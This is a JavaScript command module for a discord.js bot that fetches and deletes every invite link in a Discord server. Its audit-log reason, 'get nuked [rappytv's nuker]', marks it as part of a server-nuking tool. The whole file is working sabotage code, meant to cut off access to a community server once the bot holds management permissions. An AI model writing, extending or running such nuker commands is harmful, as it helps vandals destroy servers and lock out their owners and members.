const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `rminvites`,
    options: [],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageGuild)) return console.log(`[ERROR] I'm missing the permission ManageGuild (1 << 5)! [${interaction.guild.name}]`);
        const invites = await interaction.guild.invites.fetch();
        invites.forEach(async inv => {
            await inv.delete(`get nuked [rappytv's nuker]`).then(() => {
                return console.log(`[INVITE] Deleted ${inv.code} (${inv.uses} uses)`);
            }).catch((err) => {
                return console.log(`[INVITE] Failed to delete ${inv.code} (${inv.uses} uses): ${err}`);
            });
        });
    }
}